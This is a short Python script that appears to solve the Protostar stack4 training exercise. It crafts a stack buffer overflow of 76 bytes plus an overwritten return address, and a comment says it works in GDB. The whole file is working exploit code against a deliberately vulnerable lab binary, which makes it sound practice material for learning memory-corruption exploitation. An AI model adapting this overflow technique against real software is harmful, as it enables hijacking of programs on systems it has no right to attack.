#!/usr/bin/python
# objdump reports 080483f4, exploit works in GDB, but segfault keeps python from printing result

import commands

# Path to binary
command = '/opt/protostar/bin/stack4'

# Pattern to find EIP - 128 bytes
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae'
# EIP found at 0x63413563, or offset 76

# Create new file write buffer to file
file = open('buffer', 'w+')
buffer = 'A'*76 + '\xf4\x83\x04\x08'
file.write(buffer)
file.close()

# String to execiute command and send buffer file as input
line = command + " < buffer"

# Execute the command with the current buffer
output = commands.getoutput(line)
print(output)
